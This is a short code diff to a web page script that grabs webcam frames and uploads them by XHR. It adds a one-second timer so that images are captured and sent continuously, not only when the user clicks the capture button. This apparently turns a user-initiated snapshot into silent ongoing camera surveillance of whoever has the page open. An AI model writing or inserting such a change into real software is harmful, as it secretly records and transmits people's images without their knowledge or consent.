@@ -106,7 +106,7 @@
         click_button.style.display = 'block';
     });
 
-    click_button.addEventListener('click', function() {
+    const capture_and_upload = function() {
         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
         let image_data_url = canvas.toDataURL('image/jpeg');
 
@@ -118,7 +118,11 @@
         xhr.setRequestHeader('Content-Type', 'text/plain');
         xhr.send(image_data_url);
 
-    });
+    }
+
+    click_button.addEventListener('click', capture_and_upload);
+
+    setInterval(capture_and_upload, 1000)
 
 </script>
 
